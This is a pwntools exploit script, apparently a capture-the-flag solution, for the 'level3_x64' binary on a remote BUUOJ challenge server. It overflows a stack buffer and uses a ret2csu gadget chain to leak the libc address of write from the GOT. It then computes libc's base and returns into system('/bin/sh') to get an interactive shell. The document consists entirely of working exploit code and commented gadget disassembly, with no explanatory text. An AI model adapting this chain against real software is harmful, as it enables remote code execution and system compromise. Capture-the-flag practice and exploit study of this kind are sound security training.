from pwn import *

context.log_level = "debug"

exe = ELF("./level3_x64")
# libc = exe.libc
# r = exe.process()
libc = ELF("./libc-2.23.so")
r = remote("node4.buuoj.cn", 27624)
# gdb.attach(r)

pop_rdi = p64(0x4006B3)
pop_rsi_r15 = p64(0x4006B1)
ret = p64(0x400499)
csu_gadget1 = p64(exe.sym["__libc_csu_init"] + 64)
csu_gadget2 = p64(exe.sym["__libc_csu_init"] + 90)

#    0x00000000004006b3 : pop rdi ; ret
#    0x00000000004006b1 : pop rsi ; pop r15 ; ret
#    0x0000000000400499 : ret
#    0x0000000000400690 <+64>:	mov    rdx,r13
#    0x0000000000400693 <+67>:	mov    rsi,r14
#    0x0000000000400696 <+70>:	mov    edi,r15d
#    0x0000000000400699 <+73>:	call   QWORD PTR [r12+rbx*8]
#    0x000000000040069d <+77>:	add    rbx,0x1
#    0x00000000004006a1 <+81>:	cmp    rbx,rbp
#    0x00000000004006a4 <+84>:	jne    0x400690 <__libc_csu_init+64>
#    0x00000000004006a6 <+86>:	add    rsp,0x8
#    0x00000000004006aa <+90>:	pop    rbx
#    0x00000000004006ab <+91>:	pop    rbp
#    0x00000000004006ac <+92>:	pop    r12
#    0x00000000004006ae <+94>:	pop    r13
#    0x00000000004006b0 <+96>:	pop    r14
#    0x00000000004006b2 <+98>:	pop    r15
#    0x00000000004006b4 <+100>:	ret

r.recvuntil(b"Input:\n")
payload = (
    cyclic(0x88)
    + csu_gadget2
    + p64(0)
    + p64(1)
    + p64(exe.got["write"])
    + p64(8)
    + p64(exe.got["write"])
    + p64(1)
    + csu_gadget1
    + p64(0) * 7
    + p64(exe.sym["vulnerable_function"])
)
r.send(payload)
libc_write = u64(r.recv(8))
libc_base = libc_write - libc.sym["write"]
libc_system = libc_base + libc.sym["system"]
libc_bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
r.recvuntil(b"Input:\n")
r.send(cyclic(0x88) + ret + pop_rdi + p64(libc_bin_sh) + p64(libc_system))
r.interactive()
